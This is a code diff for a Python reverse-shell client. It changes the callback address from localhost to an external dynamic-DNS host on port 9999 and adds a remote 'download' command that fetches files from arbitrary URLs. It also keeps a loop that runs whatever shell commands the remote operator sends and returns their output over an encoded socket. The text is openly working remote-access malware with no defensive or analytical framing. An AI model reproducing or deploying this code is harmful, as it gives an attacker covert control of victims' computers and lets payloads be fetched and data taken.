@@ -4,8 +4,13 @@ import subprocess
 import select
 import time
 import ctypes
+import urllib
 
 s=socket.socket()
+
+def download(url,fname):
+
+    urllib.urlretrieve(url,fname)
 
 def frecv(sck):
 
@@ -69,7 +74,7 @@ def enc(txt):
 
 def reverseconn():
 
-    host=socket.gethostbyname("localhost") 
+    host=socket.gethostbyname("gloriouspcserver.ddns.net") 
 
     port=9999
 
@@ -95,13 +100,17 @@ def reverseconn():
 
             frecv(s)
 
+        elif dec(recvcmd[:8].decode("utf-8"))=="download":
+
+            download(dec(recvcmd[9:].decode("utf-8")),dec(s.recv(1024).decode("utf-8")))
+
         elif len(recvcmd)>0 and dec(recvcmd[:2].decode("utf-8"))!="cd":
 
             cmd = subprocess.Popen(dec(recvcmd[:].decode("utf-8")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
             obyte=cmd.stdout.read()+cmd.stderr.read()
 
-            ostr=str(obyte, "utf-8")
+            ostr=str(obyte)
 
             s.send(str.encode(enc(ostr+str(os.getcwd())+'> ')))
 
